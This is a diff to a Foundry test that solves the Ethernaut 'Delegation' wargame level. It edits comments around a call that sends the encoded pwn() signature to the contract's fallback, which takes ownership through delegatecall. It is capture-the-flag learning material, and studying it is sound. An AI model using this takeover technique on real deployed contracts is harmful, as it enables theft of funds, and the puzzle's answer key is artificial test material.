@@ -11,7 +11,6 @@ contract DelegationTest is Test {
     address player = address(100);
 
     function setUp() public {
-        // create new instance of ethernaut
         ethernaut = new Ethernaut();
         vm.deal(player, 5 ether); // give our player 5 ether
     }
@@ -31,10 +30,10 @@ contract DelegationTest is Test {
         /*
          *The more direct way to call the Delegate and claim ownership
          * is through the fallback function, as this function call it and pass it msg.data
-         * we can encode the function signature of the pwn() function to do so
-         * 1. "complex" way
+         * we can encode the function signature of the pwn() function, there are 2 ways:
+         * 1.
          * address(ethernautDelegation).call(abi.encode(bytes4(keccak256("pwn()"))));
-         *2. straightforwad way
+         *2.
          */
         (bool success, ) = address(ethernautDelegation).call(abi.encodeWithSignature("pwn()"));
         require(success);
